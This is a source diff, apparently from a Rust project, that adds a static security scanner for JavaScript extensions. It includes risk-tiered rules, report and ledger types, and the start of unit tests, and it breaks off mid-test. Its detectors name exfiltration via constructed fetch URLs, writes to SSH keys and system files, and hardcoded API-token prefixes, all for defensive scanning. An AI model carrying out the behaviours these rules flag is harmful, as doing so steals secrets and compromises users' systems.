@@ -834,6 +834,952 @@ fn capability_remediation(cap: &str) -> String {
 }
 
 // ============================================================================
+// Security Risk Classification (bd-21vng, SEC-2.3)
+// ============================================================================
+
+/// Schema version for security scan reports. Bump minor on new rules, major on
+/// breaking structural changes.
+pub const SECURITY_SCAN_SCHEMA: &str = "pi.ext.security_scan.v1";
+
+/// Stable rule identifiers. Each variant is a versioned detection rule whose
+/// semantics are frozen once shipped. Add new variants; never rename or
+/// redefine existing ones.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
+pub enum SecurityRuleId {
+    // ---- Critical tier ----
+    /// Dynamic code execution via `eval()`.
+    #[serde(rename = "SEC-EVAL-001")]
+    EvalUsage,
+    /// Dynamic code execution via `new Function(...)`.
+    #[serde(rename = "SEC-FUNC-001")]
+    NewFunctionUsage,
+    /// Native module loading via `process.binding()`.
+    #[serde(rename = "SEC-BIND-001")]
+    ProcessBinding,
+    /// Native addon loading via `process.dlopen()`.
+    #[serde(rename = "SEC-DLOPEN-001")]
+    ProcessDlopen,
+    /// Prototype pollution via `__proto__` assignment.
+    #[serde(rename = "SEC-PROTO-001")]
+    ProtoPollution,
+    /// `require.cache` manipulation for module hijacking.
+    #[serde(rename = "SEC-RCACHE-001")]
+    RequireCacheManip,
+
+    // ---- High tier ----
+    /// Hardcoded secret or API key pattern.
+    #[serde(rename = "SEC-SECRET-001")]
+    HardcodedSecret,
+    /// Dynamic `import()` expression (runtime code loading).
+    #[serde(rename = "SEC-DIMPORT-001")]
+    DynamicImport,
+    /// `Object.defineProperty` on global or prototype objects.
+    #[serde(rename = "SEC-DEFPROP-001")]
+    DefinePropertyAbuse,
+    /// Network exfiltration pattern (fetch/XMLHttpRequest to constructed URL).
+    #[serde(rename = "SEC-EXFIL-001")]
+    NetworkExfiltration,
+    /// Writes to sensitive filesystem paths.
+    #[serde(rename = "SEC-FSSENS-001")]
+    SensitivePathWrite,
+
+    // ---- Medium tier ----
+    /// `process.env` access for reading environment variables.
+    #[serde(rename = "SEC-ENV-001")]
+    ProcessEnvAccess,
+    /// Timer abuse (very short-interval `setInterval`).
+    #[serde(rename = "SEC-TIMER-001")]
+    TimerAbuse,
+    /// `Proxy` / `Reflect` interception patterns.
+    #[serde(rename = "SEC-PROXY-001")]
+    ProxyReflect,
+    /// `with` statement usage (scope chain manipulation).
+    #[serde(rename = "SEC-WITH-001")]
+    WithStatement,
+
+    // ---- Low tier ----
+    /// `debugger` statement left in source.
+    #[serde(rename = "SEC-DEBUG-001")]
+    DebuggerStatement,
+    /// `console` usage that may leak information.
+    #[serde(rename = "SEC-CONSOLE-001")]
+    ConsoleInfoLeak,
+}
+
+impl SecurityRuleId {
+    /// Short human-readable name for this rule.
+    #[must_use]
+    pub const fn name(self) -> &'static str {
+        match self {
+            Self::EvalUsage => "eval-usage",
+            Self::NewFunctionUsage => "new-function-usage",
+            Self::ProcessBinding => "process-binding",
+            Self::ProcessDlopen => "process-dlopen",
+            Self::ProtoPollution => "proto-pollution",
+            Self::RequireCacheManip => "require-cache-manipulation",
+            Self::HardcodedSecret => "hardcoded-secret",
+            Self::DynamicImport => "dynamic-import",
+            Self::DefinePropertyAbuse => "define-property-abuse",
+            Self::NetworkExfiltration => "network-exfiltration",
+            Self::SensitivePathWrite => "sensitive-path-write",
+            Self::ProcessEnvAccess => "process-env-access",
+            Self::TimerAbuse => "timer-abuse",
+            Self::ProxyReflect => "proxy-reflect",
+            Self::WithStatement => "with-statement",
+            Self::DebuggerStatement => "debugger-statement",
+            Self::ConsoleInfoLeak => "console-info-leak",
+        }
+    }
+
+    /// Default risk tier for this rule.
+    #[must_use]
+    pub const fn default_tier(self) -> RiskTier {
+        match self {
+            Self::EvalUsage
+            | Self::NewFunctionUsage
+            | Self::ProcessBinding
+            | Self::ProcessDlopen
+            | Self::ProtoPollution
+            | Self::RequireCacheManip => RiskTier::Critical,
+
+            Self::HardcodedSecret
+            | Self::DynamicImport
+            | Self::DefinePropertyAbuse
+            | Self::NetworkExfiltration
+            | Self::SensitivePathWrite => RiskTier::High,
+
+            Self::ProcessEnvAccess
+            | Self::TimerAbuse
+            | Self::ProxyReflect
+            | Self::WithStatement => RiskTier::Medium,
+
+            Self::DebuggerStatement | Self::ConsoleInfoLeak => RiskTier::Low,
+        }
+    }
+}
+
+impl fmt::Display for SecurityRuleId {
+    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        f.write_str(self.name())
+    }
+}
+
+/// Risk tier for security findings.  Ordered from most to least severe so
+/// the `Ord` derive gives the correct comparison direction.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum RiskTier {
+    /// Immediate block — active exploit vector.
+    Critical,
+    /// Likely dangerous — should block by default.
+    High,
+    /// Suspicious — warrants review.
+    Medium,
+    /// Informational risk — monitor.
+    Low,
+}
+
+impl fmt::Display for RiskTier {
+    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        match self {
+            Self::Critical => f.write_str("critical"),
+            Self::High => f.write_str("high"),
+            Self::Medium => f.write_str("medium"),
+            Self::Low => f.write_str("low"),
+        }
+    }
+}
+
+/// A single security finding from static analysis.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct SecurityFinding {
+    /// Stable rule identifier.
+    pub rule_id: SecurityRuleId,
+    /// Risk tier (may differ from `rule_id.default_tier()` if context
+    /// modifies severity).
+    pub risk_tier: RiskTier,
+    /// Human-readable rationale for the finding.
+    pub rationale: String,
+    /// Source file path (relative to extension root).
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub file: Option<String>,
+    /// 1-based line number.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub line: Option<usize>,
+    /// 1-based column number.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub column: Option<usize>,
+    /// Matched source snippet (trimmed).
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub snippet: Option<String>,
+}
+
+/// Aggregate risk classification for an extension.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct SecurityScanReport {
+    /// Schema version.
+    pub schema: String,
+    /// Extension identifier.
+    pub extension_id: String,
+    /// Overall risk tier (worst finding).
+    pub overall_tier: RiskTier,
+    /// Counts per tier.
+    pub tier_counts: SecurityTierCounts,
+    /// Individual findings sorted by tier (worst first).
+    pub findings: Vec<SecurityFinding>,
+    /// Human-readable one-line verdict.
+    pub verdict: String,
+    /// Rulebook version that produced this report.
+    pub rulebook_version: String,
+}
+
+/// Counts by risk tier.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct SecurityTierCounts {
+    pub critical: usize,
+    pub high: usize,
+    pub medium: usize,
+    pub low: usize,
+}
+
+/// Current rulebook version. Bump when rules are added or changed.
+pub const SECURITY_RULEBOOK_VERSION: &str = "1.0.0";
+
+impl SecurityScanReport {
+    /// Build from a list of findings.
+    #[must_use]
+    pub fn from_findings(extension_id: String, mut findings: Vec<SecurityFinding>) -> Self {
+        // Sort by tier (Critical first due to Ord derive).
+        findings.sort_by_key(|f| f.risk_tier);
+
+        let mut counts = SecurityTierCounts::default();
+        for f in &findings {
+            match f.risk_tier {
+                RiskTier::Critical => counts.critical += 1,
+                RiskTier::High => counts.high += 1,
+                RiskTier::Medium => counts.medium += 1,
+                RiskTier::Low => counts.low += 1,
+            }
+        }
+
+        let overall_tier = findings
+            .first()
+            .map_or(RiskTier::Low, |f| f.risk_tier);
+
+        let verdict = match overall_tier {
+            RiskTier::Critical => format!(
+                "BLOCK: {} critical finding(s) — active exploit vectors detected",
+                counts.critical
+            ),
+            RiskTier::High => format!(
+                "REVIEW REQUIRED: {} high-risk finding(s) — likely dangerous patterns",
+                counts.high
+            ),
+            RiskTier::Medium => format!(
+                "CAUTION: {} medium-risk finding(s) — warrants review",
+                counts.medium
+            ),
+            RiskTier::Low if findings.is_empty() => "CLEAN: no security findings".to_string(),
+            RiskTier::Low => format!(
+                "INFO: {} low-risk finding(s) — informational",
+                counts.low
+            ),
+        };
+
+        Self {
+            schema: SECURITY_SCAN_SCHEMA.to_string(),
+            extension_id,
+            overall_tier,
+            tier_counts: counts,
+            findings,
+            verdict,
+            rulebook_version: SECURITY_RULEBOOK_VERSION.to_string(),
+        }
+    }
+
+    /// Serialize to pretty JSON.
+    ///
+    /// # Errors
+    ///
+    /// Returns an error if serialization fails.
+    pub fn to_json(&self) -> Result<String, serde_json::Error> {
+        serde_json::to_string_pretty(self)
+    }
+
+    /// Whether the report recommends blocking the extension.
+    #[must_use]
+    pub const fn should_block(&self) -> bool {
+        matches!(self.overall_tier, RiskTier::Critical)
+    }
+
+    /// Whether the report recommends manual review.
+    #[must_use]
+    pub const fn needs_review(&self) -> bool {
+        matches!(self.overall_tier, RiskTier::Critical | RiskTier::High)
+    }
+}
+
+// ============================================================================
+// Evidence ledger for correlation with runtime behavior
+// ============================================================================
+
+/// Schema version for the security evidence ledger.
+pub const SECURITY_EVIDENCE_LEDGER_SCHEMA: &str = "pi.ext.security_evidence_ledger.v1";
+
+/// A single evidence entry for the security ledger. Designed for JSONL
+/// serialization so it can be correlated with runtime hostcall telemetry.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct SecurityEvidenceLedgerEntry {
+    pub schema: String,
+    /// Monotonic entry index within this scan.
+    pub entry_index: usize,
+    /// Extension identifier.
+    pub extension_id: String,
+    /// Rule ID that fired.
+    pub rule_id: SecurityRuleId,
+    /// Risk tier.
+    pub risk_tier: RiskTier,
+    /// Human-readable rationale.
+    pub rationale: String,
+    /// Source file (relative).
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub file: Option<String>,
+    /// 1-based line.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub line: Option<usize>,
+    /// 1-based column.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub column: Option<usize>,
+    /// Rulebook version.
+    pub rulebook_version: String,
+}
+
+impl SecurityEvidenceLedgerEntry {
+    /// Convert a `SecurityFinding` into a ledger entry.
+    #[must_use]
+    pub fn from_finding(
+        entry_index: usize,
+        extension_id: &str,
+        finding: &SecurityFinding,
+    ) -> Self {
+        Self {
+            schema: SECURITY_EVIDENCE_LEDGER_SCHEMA.to_string(),
+            entry_index,
+            extension_id: extension_id.to_string(),
+            rule_id: finding.rule_id,
+            risk_tier: finding.risk_tier,
+            rationale: finding.rationale.clone(),
+            file: finding.file.clone(),
+            line: finding.line,
+            column: finding.column,
+            rulebook_version: SECURITY_RULEBOOK_VERSION.to_string(),
+        }
+    }
+}
+
+/// Produce a JSONL evidence ledger from a security scan report.
+///
+/// # Errors
+///
+/// Returns an error if serialization of any entry fails.
+pub fn security_evidence_ledger_jsonl(
+    report: &SecurityScanReport,
+) -> Result<String, serde_json::Error> {
+    let mut out = String::new();
+    for (i, finding) in report.findings.iter().enumerate() {
+        let entry =
+            SecurityEvidenceLedgerEntry::from_finding(i, &report.extension_id, finding);
+        if i > 0 {
+            out.push('\n');
+        }
+        out.push_str(&serde_json::to_string(&entry)?);
+    }
+    Ok(out)
+}
+
+// ============================================================================
+// Security scanner implementation
+// ============================================================================
+
+/// Scans extension source for security-sensitive patterns and produces a
+/// deterministic risk classification report.
+pub struct SecurityScanner;
+
+impl SecurityScanner {
+    /// Scan raw source text and produce a security scan report.
+    #[must_use]
+    pub fn scan_source(extension_id: &str, source: &str) -> SecurityScanReport {
+        let mut findings = Vec::new();
+
+        for (idx, line) in source.lines().enumerate() {
+            let line_no = idx + 1;
+            let trimmed = line.trim();
+
+            // Skip empty lines and full-line comments.
+            if trimmed.is_empty()
+                || trimmed.starts_with("//")
+                || trimmed.starts_with('*')
+                || trimmed.starts_with("/*")
+            {
+                continue;
+            }
+
+            Self::scan_line(trimmed, line_no, &mut findings);
+        }
+
+        SecurityScanReport::from_findings(extension_id.to_string(), findings)
+    }
+
+    /// Scan extension files under a directory.
+    pub fn scan_path(
+        extension_id: &str,
+        path: &Path,
+        root: &Path,
+    ) -> SecurityScanReport {
+        let files = collect_scannable_files(path);
+        let mut findings = Vec::new();
+
+        for file_path in &files {
+            let Ok(content) = std::fs::read_to_string(file_path) else {
+                continue;
+            };
+            let rel = relative_posix_path(root, file_path);
+            let mut in_block_comment = false;
+
+            for (idx, raw_line) in content.lines().enumerate() {
+                let line_no = idx + 1;
+
+                // Track block comments.
+                let line = strip_block_comment_tracking(raw_line, &mut in_block_comment);
+                let trimmed = line.trim();
+
+                if trimmed.is_empty()
+                    || trimmed.starts_with("//")
+                    || trimmed.starts_with('*')
+                {
+                    continue;
+                }
+
+                Self::scan_line_with_file(trimmed, line_no, &rel, &mut findings);
+            }
+        }
+
+        SecurityScanReport::from_findings(extension_id.to_string(), findings)
+    }
+
+    fn scan_line(text: &str, line_no: usize, findings: &mut Vec<SecurityFinding>) {
+        Self::scan_line_with_file(text, line_no, "", findings);
+    }
+
+    #[allow(clippy::too_many_lines)]
+    fn scan_line_with_file(
+        text: &str,
+        line_no: usize,
+        file: &str,
+        findings: &mut Vec<SecurityFinding>,
+    ) {
+        let file_opt = if file.is_empty() {
+            None
+        } else {
+            Some(file.to_string())
+        };
+
+        // ---- Critical tier ----
+
+        // SEC-EVAL-001: eval() usage (not in string or property name).
+        if contains_eval_call(text) {
+            findings.push(SecurityFinding {
+                rule_id: SecurityRuleId::EvalUsage,
+                risk_tier: RiskTier::Critical,
+                rationale: "eval() enables arbitrary code execution at runtime".to_string(),
+                file: file_opt.clone(),
+                line: Some(line_no),
+                column: text.find("eval(").map(|c| c + 1),
+                snippet: Some(truncate_snippet(text)),
+            });
+        }
+
+        // SEC-FUNC-001: new Function(...).
+        if text.contains("new Function") && !text.contains("new Function()") {
+            findings.push(SecurityFinding {
+                rule_id: SecurityRuleId::NewFunctionUsage,
+                risk_tier: RiskTier::Critical,
+                rationale: "new Function() creates code from strings, enabling injection"
+                    .to_string(),
+                file: file_opt.clone(),
+                line: Some(line_no),
+                column: text.find("new Function").map(|c| c + 1),
+                snippet: Some(truncate_snippet(text)),
+            });
+        }
+
+        // SEC-BIND-001: process.binding().
+        if text.contains("process.binding") {
+            findings.push(SecurityFinding {
+                rule_id: SecurityRuleId::ProcessBinding,
+                risk_tier: RiskTier::Critical,
+                rationale: "process.binding() accesses internal Node.js C++ bindings"
+                    .to_string(),
+                file: file_opt.clone(),
+                line: Some(line_no),
+                column: text.find("process.binding").map(|c| c + 1),
+                snippet: Some(truncate_snippet(text)),
+            });
+        }
+
+        // SEC-DLOPEN-001: process.dlopen().
+        if text.contains("process.dlopen") {
+            findings.push(SecurityFinding {
+                rule_id: SecurityRuleId::ProcessDlopen,
+                risk_tier: RiskTier::Critical,
+                rationale: "process.dlopen() loads native addons, bypassing sandbox"
+                    .to_string(),
+                file: file_opt.clone(),
+                line: Some(line_no),
+                column: text.find("process.dlopen").map(|c| c + 1),
+                snippet: Some(truncate_snippet(text)),
+            });
+        }
+
+        // SEC-PROTO-001: __proto__ assignment.
+        if text.contains("__proto__") || text.contains("Object.setPrototypeOf") {
+            findings.push(SecurityFinding {
+                rule_id: SecurityRuleId::ProtoPollution,
+                risk_tier: RiskTier::Critical,
+                rationale: "Prototype manipulation can pollute shared object chains"
+                    .to_string(),
+                file: file_opt.clone(),
+                line: Some(line_no),
+                column: text
+                    .find("__proto__")
+                    .or_else(|| text.find("Object.setPrototypeOf"))
+                    .map(|c| c + 1),
+                snippet: Some(truncate_snippet(text)),
+            });
+        }
+
+        // SEC-RCACHE-001: require.cache manipulation.
+        if text.contains("require.cache") {
+            findings.push(SecurityFinding {
+                rule_id: SecurityRuleId::RequireCacheManip,
+                risk_tier: RiskTier::Critical,
+                rationale:
+                    "require.cache manipulation can hijack module resolution".to_string(),
+                file: file_opt.clone(),
+                line: Some(line_no),
+                column: text.find("require.cache").map(|c| c + 1),
+                snippet: Some(truncate_snippet(text)),
+            });
+        }
+
+        // ---- High tier ----
+
+        // SEC-SECRET-001: hardcoded secrets.
+        if contains_hardcoded_secret(text) {
+            findings.push(SecurityFinding {
+                rule_id: SecurityRuleId::HardcodedSecret,
+                risk_tier: RiskTier::High,
+                rationale: "Potential hardcoded secret or API key detected".to_string(),
+                file: file_opt.clone(),
+                line: Some(line_no),
+                column: None,
+                snippet: Some(truncate_snippet(text)),
+            });
+        }
+
+        // SEC-DIMPORT-001: dynamic import().
+        if contains_dynamic_import(text) {
+            findings.push(SecurityFinding {
+                rule_id: SecurityRuleId::DynamicImport,
+                risk_tier: RiskTier::High,
+                rationale: "Dynamic import() can load arbitrary modules at runtime"
+                    .to_string(),
+                file: file_opt.clone(),
+                line: Some(line_no),
+                column: text.find("import(").map(|c| c + 1),
+                snippet: Some(truncate_snippet(text)),
+            });
+        }
+
+        // SEC-DEFPROP-001: Object.defineProperty on global/prototype.
+        if text.contains("Object.defineProperty")
+            && (text.contains("globalThis")
+                || text.contains("global.")
+                || text.contains("prototype"))
+        {
+            findings.push(SecurityFinding {
+                rule_id: SecurityRuleId::DefinePropertyAbuse,
+                risk_tier: RiskTier::High,
+                rationale:
+                    "Object.defineProperty on global/prototype can intercept operations"
+                        .to_string(),
+                file: file_opt.clone(),
+                line: Some(line_no),
+                column: text.find("Object.defineProperty").map(|c| c + 1),
+                snippet: Some(truncate_snippet(text)),
+            });
+        }
+
+        // SEC-EXFIL-001: Network exfiltration patterns.
+        if contains_exfiltration_pattern(text) {
+            findings.push(SecurityFinding {
+                rule_id: SecurityRuleId::NetworkExfiltration,
+                risk_tier: RiskTier::High,
+                rationale: "Potential data exfiltration via constructed network request"
+                    .to_string(),
+                file: file_opt.clone(),
+                line: Some(line_no),
+                column: None,
+                snippet: Some(truncate_snippet(text)),
+            });
+        }
+
+        // SEC-FSSENS-001: Writes to sensitive paths.
+        if contains_sensitive_path_write(text) {
+            findings.push(SecurityFinding {
+                rule_id: SecurityRuleId::SensitivePathWrite,
+                risk_tier: RiskTier::High,
+                rationale: "Write to security-sensitive filesystem path detected"
+                    .to_string(),
+                file: file_opt.clone(),
+                line: Some(line_no),
+                column: None,
+                snippet: Some(truncate_snippet(text)),
+            });
+        }
+
+        // ---- Medium tier ----
+
+        // SEC-ENV-001: process.env access.
+        if text.contains("process.env") {
+            findings.push(SecurityFinding {
+                rule_id: SecurityRuleId::ProcessEnvAccess,
+                risk_tier: RiskTier::Medium,
+                rationale: "process.env access may expose secrets or configuration"
+                    .to_string(),
+                file: file_opt.clone(),
+                line: Some(line_no),
+                column: text.find("process.env").map(|c| c + 1),
+                snippet: Some(truncate_snippet(text)),
+            });
+        }
+
+        // SEC-TIMER-001: Timer abuse (very short intervals).
+        if contains_timer_abuse(text) {
+            findings.push(SecurityFinding {
+                rule_id: SecurityRuleId::TimerAbuse,
+                risk_tier: RiskTier::Medium,
+                rationale: "Very short timer interval may indicate resource abuse"
+                    .to_string(),
+                file: file_opt.clone(),
+                line: Some(line_no),
+                column: None,
+                snippet: Some(truncate_snippet(text)),
+            });
+        }
+
+        // SEC-PROXY-001: Proxy/Reflect usage.
+        if text.contains("new Proxy") || text.contains("Reflect.") {
+            findings.push(SecurityFinding {
+                rule_id: SecurityRuleId::ProxyReflect,
+                risk_tier: RiskTier::Medium,
+                rationale:
+                    "Proxy/Reflect can intercept and modify object operations transparently"
+                        .to_string(),
+                file: file_opt.clone(),
+                line: Some(line_no),
+                column: text
+                    .find("new Proxy")
+                    .or_else(|| text.find("Reflect."))
+                    .map(|c| c + 1),
+                snippet: Some(truncate_snippet(text)),
+            });
+        }
+
+        // SEC-WITH-001: with statement.
+        if contains_with_statement(text) {
+            findings.push(SecurityFinding {
+                rule_id: SecurityRuleId::WithStatement,
+                risk_tier: RiskTier::Medium,
+                rationale:
+                    "with statement modifies scope chain, making variable resolution unpredictable"
+                        .to_string(),
+                file: file_opt.clone(),
+                line: Some(line_no),
+                column: text.find("with").map(|c| c + 1),
+                snippet: Some(truncate_snippet(text)),
+            });
+        }
+
+        // ---- Low tier ----
+
+        // SEC-DEBUG-001: debugger statement.
+        if text.contains("debugger") && is_debugger_statement(text) {
+            findings.push(SecurityFinding {
+                rule_id: SecurityRuleId::DebuggerStatement,
+                risk_tier: RiskTier::Low,
+                rationale: "debugger statement left in production code".to_string(),
+                file: file_opt.clone(),
+                line: Some(line_no),
+                column: text.find("debugger").map(|c| c + 1),
+                snippet: Some(truncate_snippet(text)),
+            });
+        }
+
+        // SEC-CONSOLE-001: console.error/warn with interpolated values.
+        if contains_console_info_leak(text) {
+            findings.push(SecurityFinding {
+                rule_id: SecurityRuleId::ConsoleInfoLeak,
+                risk_tier: RiskTier::Low,
+                rationale: "Console output may leak sensitive information".to_string(),
+                file: file_opt,
+                line: Some(line_no),
+                column: text.find("console.").map(|c| c + 1),
+                snippet: Some(truncate_snippet(text)),
+            });
+        }
+    }
+}
+
+// ============================================================================
+// Pattern detection helpers
+// ============================================================================
+
+/// Check for `eval(...)` that isn't in a property name or string context.
+fn contains_eval_call(text: &str) -> bool {
+    let mut search = text;
+    while let Some(pos) = search.find("eval(") {
+        // Not preceded by a dot (method call on object) or letter (part of
+        // another identifier like `retrieval`).
+        if pos == 0 || !text.as_bytes()[pos - 1].is_ascii_alphanumeric() && text.as_bytes()[pos - 1] != b'.' {
+            return true;
+        }
+        search = &search[pos + 5..];
+    }
+    false
+}
+
+/// Check for dynamic `import(...)` — not static `import ... from`.
+fn contains_dynamic_import(text: &str) -> bool {
+    let trimmed = text.trim();
+    // Static import statements start with `import` at the beginning.
+    if trimmed.starts_with("import ") || trimmed.starts_with("import{") {
+        return false;
+    }
+    text.contains("import(")
+}
+
+/// Detect hardcoded secret patterns: API keys, tokens, passwords.
+fn contains_hardcoded_secret(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    // Look for assignment patterns with secret-like names.
+    let secret_keywords = [
+        "api_key", "apikey", "api-key",
+        "secret_key", "secretkey", "secret-key",
+        "password", "passwd",
+        "access_token", "accesstoken",
+        "private_key", "privatekey",
+        "auth_token", "authtoken",
+    ];
+
+    for kw in &secret_keywords {
+        if let Some(kw_pos) = lower.find(kw) {
+            // Check if followed by assignment with a string literal.
+            let rest = &text[kw_pos + kw.len()..];
+            let rest_trimmed = rest.trim_start();
+            if (rest_trimmed.starts_with("=\"")
+                || rest_trimmed.starts_with("= \"")
+                || rest_trimmed.starts_with("='")
+                || rest_trimmed.starts_with("= '")
+                || rest_trimmed.starts_with(": \"")
+                || rest_trimmed.starts_with(":\"")
+                || rest_trimmed.starts_with(": '")
+                || rest_trimmed.starts_with(":'"))
+                // Ignore env lookups: process.env.API_KEY
+                && !lower[..kw_pos].ends_with("process.env.")
+                && !lower[..kw_pos].ends_with("env.")
+                // Ignore empty strings.
+                && !rest_trimmed.starts_with("=\"\"")
+                && !rest_trimmed.starts_with("= \"\"")
+                && !rest_trimmed.starts_with("=''")
+                && !rest_trimmed.starts_with("= ''")
+            {
+                return true;
+            }
+        }
+    }
+
+    // Also detect common token prefixes (sk-ant-, ghp_, etc.) assigned as literals.
+    let token_prefixes = ["sk-ant-", "sk-", "ghp_", "gho_", "glpat-", "xoxb-", "xoxp-"];
+    for pfx in &token_prefixes {
+        if text.contains(&format!("\"{pfx}")) || text.contains(&format!("'{pfx}")) {
+            return true;
+        }
+    }
+
+    false
+}
+
+/// Detect network exfiltration: fetch/XMLHttpRequest with template literals
+/// or concatenated URLs (not simple static URLs).
+fn contains_exfiltration_pattern(text: &str) -> bool {
+    let has_network_call = text.contains("fetch(") || text.contains("XMLHttpRequest");
+    if !has_network_call {
+        return false;
+    }
+    // Suspicious if URL is constructed from variables (template literal or concat).
+    text.contains("fetch(`") || text.contains("fetch(\"http\" +") || text.contains("fetch(url")
+}
+
+/// Detect writes to sensitive filesystem paths.
+fn contains_sensitive_path_write(text: &str) -> bool {
+    let has_write = text.contains("writeFileSync")
+        || text.contains("writeFile(")
+        || text.contains("fs.write")
+        || text.contains("appendFileSync")
+        || text.contains("appendFile(");
+    if !has_write {
+        return false;
+    }
+    let sensitive_paths = [
+        "/etc/", "/root/", "~/.ssh", "~/.bashrc", "~/.profile",
+        "~/.zshrc", "/usr/", "/var/", ".env", "id_rsa", "authorized_keys",
+    ];
+    sensitive_paths.iter().any(|p| text.contains(p))
+}
+
+/// Detect very short timer intervals (< 10ms).
+fn contains_timer_abuse(text: &str) -> bool {
+    if !text.contains("setInterval") {
+        return false;
+    }
+    // Look for setInterval(..., N) where N < 10.
+    if let Some(pos) = text.rfind(", ") {
+        let rest = text[pos + 2..].trim_end_matches(')').trim();
+        if let Ok(ms) = rest.parse::<u64>() {
+            return ms < 10;
+        }
+    }
+    false
+}
+
+/// Detect `with (...)` statement — not `width` or `without`.
+fn contains_with_statement(text: &str) -> bool {
+    let trimmed = text.trim();
+    // `with` as a statement: `with (` at statement position.
+    if trimmed.starts_with("with (") || trimmed.starts_with("with(") {
+        return true;
+    }
+    // Also catch `} with (` for inline blocks.
+    if let Some(pos) = text.find("with") {
+        if pos > 0 {
+            let before = text[..pos].trim_end();
+            let after = text[pos + 4..].trim_start();
+            if (before.ends_with('{') || before.ends_with('}') || before.ends_with(';'))
+                && after.starts_with('(')
+            {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+/// Detect `debugger;` as a standalone statement.
+fn is_debugger_statement(text: &str) -> bool {
+    let trimmed = text.trim();
+    trimmed == "debugger;" || trimmed == "debugger" || trimmed.starts_with("debugger;")
+}
+
+/// Detect console.error/warn/log with interpolated values (not just strings).
+fn contains_console_info_leak(text: &str) -> bool {
+    // Only flag console.error/warn which more likely leak sensitive data.
+    if !text.contains("console.error") && !text.contains("console.warn") {
+        return false;
+    }
+    // Flag if there's variable interpolation or multiple args.
+    text.contains("console.error(") || text.contains("console.warn(")
+}
+
+/// Truncate a source snippet to a reasonable display length.
+fn truncate_snippet(text: &str) -> String {
+    const MAX_SNIPPET_LEN: usize = 200;
+    if text.len() <= MAX_SNIPPET_LEN {
+        text.to_string()
+    } else {
+        format!("{}...", &text[..MAX_SNIPPET_LEN])
+    }
+}
+
+/// Collect JS/TS files from a path (file or directory).
+fn collect_scannable_files(path: &Path) -> Vec<std::path::PathBuf> {
+    if path.is_file() {
+        return vec![path.to_path_buf()];
+    }
+    let mut files = Vec::new();
+    if let Ok(entries) = std::fs::read_dir(path) {
+        for entry in entries.flatten() {
+            let p = entry.path();
+            if p.is_dir() {
+                // Skip node_modules and hidden dirs.
+                let name = p.file_name().and_then(|n| n.to_str()).unwrap_or("");
+                if name == "node_modules" || name.starts_with('.') {
+                    continue;
+                }
+                files.extend(collect_scannable_files(&p));
+            } else if p.is_file() {
+                if let Some(ext) = p.extension().and_then(|e| e.to_str()) {
+                    if matches!(ext, "js" | "ts" | "mjs" | "mts" | "cjs" | "cts" | "jsx" | "tsx") {
+                        files.push(p);
+                    }
+                }
+            }
+        }
+    }
+    files.sort();
+    files
+}
+
+/// Compute relative POSIX path from root to path.
+fn relative_posix_path(root: &Path, path: &Path) -> String {
+    path.strip_prefix(root)
+        .unwrap_or(path)
+        .to_string_lossy()
+        .replace('\\', "/")
+}
+
+/// Strip block comments for security scanning. Simpler than the full
+/// compat scanner's `strip_js_comments` — we only need to track the
+/// block comment state to avoid false positives.
+fn strip_block_comment_tracking(line: &str, in_block: &mut bool) -> String {
+    let mut result = String::with_capacity(line.len());
+    let bytes = line.as_bytes();
+    let mut i = 0;
+
+    while i < bytes.len() {
+        if *in_block {
+            if i + 1 < bytes.len() && bytes[i] == b'*' && bytes[i + 1] == b'/' {
+                *in_block = false;
+                i += 2;
+            } else {
+                i += 1;
+            }
+        } else if i + 1 < bytes.len() && bytes[i] == b'/' && bytes[i + 1] == b'*' {
+            *in_block = true;
+            i += 2;
+        } else if i + 1 < bytes.len() && bytes[i] == b'/' && bytes[i + 1] == b'/' {
+            // Rest of line is comment.
+            break;
+        } else {
+            result.push(bytes[i] as char);
+            i += 1;
+        }
+    }
+
+    result
+}
+
+// ============================================================================
 // Tests
 // ============================================================================
 
@@ -1433,5 +2379,441 @@ pi.exec("ls");
     fn capability_remediation_other() {
         let r = capability_remediation("http");
         assert!(r.contains("default_caps"));
+    }
+
+    // ================================================================
+    // Security scanner tests (bd-21vng)
+    // ================================================================
+
+    fn scan(source: &str) -> SecurityScanReport {
+        SecurityScanner::scan_source("test-ext", source)
+    }
+
+    fn has_rule(report: &SecurityScanReport, rule: SecurityRuleId) -> bool {
+        report.findings.iter().any(|f| f.rule_id == rule)
+    }
+
+    // ---- RiskTier ----
+
+    #[test]
+    fn risk_tier_ordering() {
+        assert!(RiskTier::Critical < RiskTier::High);
+        assert!(RiskTier::High < RiskTier::Medium);
+        assert!(RiskTier::Medium < RiskTier::Low);
+    }
+
+    #[test]
+    fn risk_tier_serde_roundtrip() {
+        for tier in [
+            RiskTier::Critical,
+            RiskTier::High,
+            RiskTier::Medium,
+            RiskTier::Low,
+        ] {
+            let json = serde_json::to_string(&tier).unwrap();
+            let back: RiskTier = serde_json::from_str(&json).unwrap();
+            assert_eq!(tier, back);
+        }
+    }
+
+    #[test]
+    fn risk_tier_display() {
+        assert_eq!(format!("{}", RiskTier::Critical), "critical");
+        assert_eq!(format!("{}", RiskTier::Low), "low");
+    }
+
+    // ---- SecurityRuleId ----
+
+    #[test]
+    fn rule_id_serde_roundtrip() {
+        let rule = SecurityRuleId::EvalUsage;
+        let json = serde_json::to_string(&rule).unwrap();
+        assert_eq!(json, "\"SEC-EVAL-001\"");
+        let back: SecurityRuleId = serde_json::from_str(&json).unwrap();
+        assert_eq!(rule, back);
+    }
+
+    #[test]
+    fn rule_id_default_tier_consistency() {
+        // All critical rules should have Critical tier.
+        assert_eq!(
